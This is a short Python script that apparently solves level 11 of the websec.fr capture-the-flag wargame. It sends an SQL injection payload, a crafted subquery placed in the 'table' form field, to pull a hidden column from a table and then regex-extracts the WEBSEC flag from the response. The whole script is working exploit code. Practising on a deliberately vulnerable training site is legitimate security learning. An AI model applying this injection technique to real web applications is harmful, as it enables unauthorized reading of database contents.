import httpx
import re

url = "https://websec.fr/level11/index.php"

id = 5
table = "(select 5 id, enemy username from costume)"

r = httpx.post(url, data={ "user_id" : id, "table" : table, "submit" : "submit" })
flag = re.search(r"WEBSEC\{.*\}", r.text)[0]

print(flag)